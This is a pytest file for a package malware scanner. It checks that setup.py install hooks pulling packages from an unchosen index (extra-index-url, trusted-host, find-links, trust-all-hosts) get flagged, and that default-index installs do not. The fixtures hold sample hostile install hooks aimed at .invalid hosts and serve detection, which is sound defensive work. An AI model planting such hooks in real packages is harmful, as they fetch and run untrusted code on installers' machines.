"""Packages installed from an index the user did not choose (`flows/foreign_index.py`).

Every source is assembled for the test and only parsed; the hosts are under `.invalid`. The twins
install from the default index or are a build backend doing so."""

from __future__ import annotations

import io
import tarfile
from typing import TYPE_CHECKING

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

if TYPE_CHECKING:
    from pathlib import Path

INSTALL = (
    "import subprocess, sys\n"
    "from setuptools import setup\n"
    "from setuptools.command.install import install\n"
    "class Post(install):\n"
    "    def run(self):\n"
    "        install.run(self)\n"
    "        {body}\n"
    "setup(name='demo', cmdclass={{'install': Post}})\n"
)


class Kit:
    @staticmethod
    def rules(tmp_path: Path, members: dict[str, str]) -> set[str]:
        files = {"PKG-INFO": "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n", "demo/__init__.py": "", **members}
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in files.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}


class TestAnInstallHookThatPullsFromAnotherIndex:
    @pytest.mark.parametrize(
        "body",
        [
            "subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--extra-index-url', 'https://p.invalid/simple', 'dep'])",
            "subprocess.run('pip install --index-url https://p.invalid/simple dep', shell=True)",
            "subprocess.run([sys.executable, '-m', 'pip', 'install', '--trusted-host', 'p.invalid', 'dep'])",
            "subprocess.run(['pip', 'install', '-f', 'https://p.invalid/files', 'dep'])",
        ],
    )
    def test_the_install_command_blocks(self, tmp_path: Path, body: str) -> None:
        rules = Kit.rules(tmp_path, {"setup.py": INSTALL.format(body=body)})
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" in rules

    def test_a_library_told_to_trust_every_host_blocks(self, tmp_path: Path) -> None:
        body = "PInst(trust_all_hosts=True).install(['a'], ['b'])"
        rules = Kit.rules(tmp_path, {"setup.py": INSTALL.format(body=body)})
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" in rules

    def test_the_update_in_a_module_the_install_command_calls(self, tmp_path: Path) -> None:
        setup = (
            "from setuptools import setup\n"
            "from setuptools.command.install import install\n"
            "import utils\n"
            "class Post(install):\n"
            "    def run(self):\n"
            "        install.run(self)\n"
            "        utils.update('abc')\n"
            "setup(name='demo', cmdclass={'install': Post})\n"
        )
        utils = (
            "def update(token):\n"
            "    p = PInst(trust_all_hosts=True)\n"
            "    p.install(['a'], ['b'])\n"
        )
        rules = Kit.rules(tmp_path, {"setup.py": setup, "utils.py": utils})
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" in rules


class TestOrdinaryInstalls:
    def test_the_default_index_is_not(self, tmp_path: Path) -> None:
        body = "subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wheel'])"
        rules = Kit.rules(tmp_path, {"setup.py": INSTALL.format(body=body)})
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" not in rules

    def test_a_requirement_file_is_not(self, tmp_path: Path) -> None:
        body = "subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])"
        rules = Kit.rules(tmp_path, {"setup.py": INSTALL.format(body=body)})
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" not in rules

    def test_the_same_flag_in_a_tool_nothing_installs_is_not_an_install_finding(self, tmp_path: Path) -> None:
        tool = (
            "import subprocess\n"
            "def add(package, index):\n"
            "    subprocess.run(['pip', 'install', '--extra-index-url', index, package])\n"
        )
        members = {"setup.py": "from setuptools import setup\nsetup(name='demo')\n", "demo/tool.py": tool}
        assert "MALWARE.INSTALL.FOREIGN_INDEX.001" not in Kit.rules(tmp_path, members)
